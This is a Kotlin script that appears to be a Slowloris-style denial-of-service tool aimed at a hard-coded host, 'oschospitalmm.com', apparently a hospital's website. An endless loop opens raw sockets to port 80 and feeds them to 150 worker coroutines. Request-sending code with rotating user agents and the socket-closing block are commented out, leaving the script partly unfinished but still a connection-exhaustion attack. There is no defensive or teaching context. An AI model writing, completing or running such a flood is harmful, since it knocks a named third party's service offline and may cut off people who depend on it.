import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.flow.take
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.net.*
import java.util.*

suspend fun main(): Unit = runBlocking {
    val client = HttpClient(CIO)
    val host = "oschospitalmm.com"
    val port = 80
    val socketCount = 150
    val sleepTime = 15

    val connections = Channel<Socket>(100)
    val mutex = Mutex()
    val user_agents = arrayOf("agent1", "agent2", "agent3")


    launch {
        while (true) {
            val socket = withContext(Dispatchers.IO) {
                Socket(InetAddress.getByName(host), port)
            }
            connections.send(socket)
        }
    }

    launch {
        for (i in 1..socketCount) {
            launch {

                while (true) {
                    val socket = connections.receive()

//                    val request = client.request("GET", "http://$host:$port/?${Random.nextInt(2000)}")
//                    request.headers.append("User-Agent", user_agents[Random.nextInt(user_agents.size)])
//                    request.headers.append("Accept-language", "en-US,en,q=0.5")
//                    request.execute()
                }
            }
        }
    }

//    launch {
//        connections.take(socketCount).collect {
//            println("Closed socket")
//            it.close()
//        }
//    }
}
